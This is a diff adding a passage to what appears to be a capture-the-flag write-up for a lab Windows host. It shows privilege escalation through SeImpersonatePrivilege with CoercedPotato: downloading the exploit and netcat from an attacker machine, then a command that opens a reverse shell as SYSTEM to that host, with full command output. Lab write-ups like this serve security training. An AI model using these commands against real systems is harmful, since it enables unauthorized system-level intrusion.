@@ -851,8 +851,61 @@ Then I checked our current privileges:
           SeImpersonatePrivilege        Impersonate a client after authentication Enabled
           ...
           
-Since SeImpersonatePrivilege is enabled we can use some potatoes to try to escalate our privileges
+Since SeImpersonatePrivilege is enabled we can use some potatoes to try to escalate our privileges to system. Once of my favourites is [CoercedPotato](https://github.com/hackvens/CoercedPotato). Once downloaded the source code you can compile it using Visual Studio CE 2022. Then I proceeded to download the exploit from my attacker machine:
+
+          PS C:\Users\edwardle.WINDCORP\Documents> 
+          Invoke-WebRequest http://10.9.1.97:8000/CoercedPotato.exe -outfile cp.exe
+          PS C:\Users\edwardle.WINDCORP\Documents> 
+          dir
+          Directory: C:\Users\edwardle.WINDCORP\Documents
+
+          Mode                LastWriteTime         Length Name                                                                  
+          ----                -------------         ------ ----                                                                  
+          -a----         7/3/2024   7:16 AM         355840 cp.exe                                                                
+          -a----         7/3/2024   6:48 AM             60 surfsup.cmd                                                           
           
+Try to see if the tool works:
+
+          PS C:\Users\edwardle.WINDCORP\Documents> 
+          .\cp.exe -h
+          ...
+                                                     @Hack0ura @Prepouce    
+                                                                  
+          CoercedPotato is an automated tool for privilege escalation exploit using SeImpersonatePrivilege or SeImpersonatePrimaryToken.
+          Usage: C:\Users\edwardle.WINDCORP\Documents\cp.exe [OPTIONS]
+          ...
+
+In order to get a shell as system we ned to upload netcat as well:
+
+          Invoke-WebRequest http://10.9.1.97:8000/nc64.exe -outfile nc.exe
+          
+Then execute the exploit:
+
+          .\cp.exe -c "nc.exe 10.9.1.97 1234 -e cmd"
+          ....
+          [+] RUNNING ALL KNOWN EXPLOITS.
+          [PIPESERVER] Creating a thread launching a server pipe listening on Named Pipe \\.\pipe\axcxwfB\pipe\spoolss.
+          [PIPESERVER] Named pipe '\\.\pipe\axcxwfB\pipe\spoolss' listening...
+          [MS-RPRN] [*] Attempting MS-RPRN functions...
+          [MS-RPRN] Starting RPC functions fuzzing...
+          [MS-RPRN] [*] Invoking RpcRemoteFindFirstPrinterChangeNotificationEx with target path: \\127.0.0.1/pipe/axcxwfB
+          [PIPESERVER] A client connected!
+          ** Exploit completed **
+          _________________________________________________________________________________________________________________
+          Running...
+And in our ataacker machine:
+
+          nc -lvp 1234                           
+          listening on [any] 1234 ...
+          connect to [10.9.1.97] from fire.windcorp.thm [10.10.250.121] 60909
+          Microsoft Windows [Version 10.0.17763.1158]
+          (c) 2018 Microsoft Corporation. All rights reserved.
+          
+          C:\Windows\system32>whoami
+          whoami
+          nt authority\system
+
+ 
 
 
     
